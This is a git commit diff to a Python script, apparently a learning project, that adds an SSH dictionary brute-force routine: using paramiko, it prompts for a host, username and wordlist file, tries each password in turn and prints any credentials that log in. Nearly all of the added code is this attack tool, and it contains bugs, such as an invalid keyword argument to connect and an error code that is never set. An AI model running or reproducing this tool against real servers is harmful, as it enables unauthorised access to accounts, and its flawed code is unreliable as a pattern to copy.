1a35cf46a0b3a6638a2a0a43fcfe41a4e125c0c2
rcaoagdan <rcaoagdan@icloud.com>
2021-08-18 16:20:15 -0700

    update

--- Brute_Force_Attack/bruteForce.py
+++ Brute_Force_Attack/bruteForce.py
@@ -7,9 +7,10 @@
 ##############################################################################
 # Import Library
 ##############################################################################
-import getpass
 import time
 import itertools
+import sys, os, socket
+import  paramiko 
 
 ##############################################################################
 # Declare Functions
@@ -36,6 +37,43 @@ def runCheckPass():
     wordList.close()
     print(" ")
 
+def sshConnect(ssh_host,ssh_user,ssh_pwd, connectStat = 0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        ssh.connect(ssh_host, username=ssh_user, password=ssh_pwd, connectStat=0)
+
+    except paramiko.AuthenticationException:
+        connectStat = 1 # Failed Authentication
+    ssh.close()
+
+    return connectStat
+
+def bruteForce():
+    ssh_host = input("Enter host: ")
+    ssh_user = input("Enter username: ")
+    filePath = input("Enter Dictionary File Path: \n")
+
+    with open(filePath) as wordList:
+        for passWrd in wordList:
+            ssh_pwd = passWrd.strip('\n')
+            print("Testing: " + str(ssh_pwd))
+            connection = sshConnect(ssh_host,ssh_user,ssh_pwd)
+
+            if connection == 0:
+                print ('Succesful login to: ' + str(ssh_host) + ' username: ' + str(ssh_user) + ' password: ' + str(ssh_pwd))
+            elif connection == 1:
+                print ('No succesful attempts. Password not found')
+            elif connection == 2:
+                print("Connection could not be establish to: " + str(ssh_host))
+            else:
+                print ("UNKOWN ERROR")
+        
+
+  
+    print(" ")
+
 ##############################################################################
 # Main
 ##############################################################################
@@ -44,7 +82,8 @@ if __name__ == '__main__':
         print("Brute Force Attack Menu \n")
         print("1: Offensive- Dictionary Iterator")
         print("2: Defensive- Password Recognized")
-        print("3: Exit")
+        print("3: Brute Force")
+        print("4: Exit")
         mode=input("Please make a selection: ")
 
         if(mode == "1"):
@@ -52,6 +91,8 @@ if __name__ == '__main__':
         elif(mode == "2"):
             runCheckPass()
         elif(mode == "3"):
+            bruteForce()
+        elif(mode == "4"):
             break
         else:
             print("INVALID SELECTION \n")
